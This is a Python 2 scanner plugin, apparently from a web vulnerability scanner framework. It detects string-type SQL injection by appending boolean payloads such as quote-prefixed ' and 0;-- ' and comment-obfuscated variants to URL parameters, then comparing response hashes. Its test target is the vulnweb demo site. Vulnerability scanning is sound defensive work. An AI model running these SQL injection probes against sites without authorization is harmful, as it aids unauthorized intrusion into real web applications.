#!/usr/bin/env python
#-*- coding:utf-8 -*-
# 只寻找字符型的注入点

from dummy import *
import urlparse
import hashlib
from urllib import quote as urlencode
from urllib import unquote as urldecode

def md5(src):
    m2 = hashlib.md5()
    m2.update(src)
    return m2.hexdigest()

def assign(service, arg):
    if service == 'spider_file':
        return True, arg

def audit(url,html):
    parse = urlparse.urlparse(url)
    if not parse.query:
        return

    for path in parse.query.split('&'):
        k, v = path.split('=')
        if(v.isalnum()):
            quotes = ['\'' , '"','']
            payload_0 = [" and 0;-- ","/**/and/**/0;#","\tand\t0;#","\nand/**/0;#"]
            payload_1 = [" and 1;-- ","/**/and/**/1;#","\tand\t1;#","\nand/**/1;#"]

            for i in quotes:
                for j in range(len(payload_0)):
                    p0 = i + payload_0[j]
                    p1 = i + payload_1[j]
                    try:
                        url_1 = url.replace("%s=%s"%(k,v),"%s=%s"%(k,v+urlencode(p0)))
                        url_2 = url.replace("%s=%s"%(k,v),"%s=%s"%(k,v+urlencode(p1)))
                        res_md5_1 = md5(html)
                        code, head, html, redirect_url, log = hackhttp.http(url_1)
                        res_md5_2 = md5(html)
                        code, head, html, redirect_url, log = hackhttp.http(url_2)
                        res_md5_3 = md5(html)
                    except Exception,e:
                        print e
                        res_md5_1 = res_md5_2 = res_md5_3 = 0
                    if ( res_md5_1 == res_md5_3 ) and res_md5_1 != res_md5_2:
                        security_hole("[String SQL injection] " + url + " " + log["request"])

if __name__ == '__main__':
    url = "http://testphp.vulnweb.com/listproducts.php?artist=1"
    code, head, html, redirect_url, log = hackhttp.http(url)
    audit(url,html)